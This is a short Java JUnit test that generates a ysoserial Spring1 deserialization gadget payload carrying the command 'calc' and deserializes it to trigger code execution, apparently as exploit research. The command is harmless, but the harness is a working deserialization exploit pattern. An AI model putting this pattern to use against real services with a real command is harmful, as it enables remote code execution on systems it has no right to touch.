package angelwhu.payloadTest;

import org.junit.Test;

import ysoserial.payloads.CommonsBeanutilsCollectionsLogging1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.Spring1;
import angelwhu.serialization.SerializationUtil;

public class Spring1PayloadTest {

	@Test
	public void testPayload() throws Exception
	{
		
		
		String command = "calc";
		ObjectPayload<?> payload = new Spring1();
		final Object object = payload.getObject(command);
		SerializationUtil.readObjectFromStream(object);
		
	}
	
}
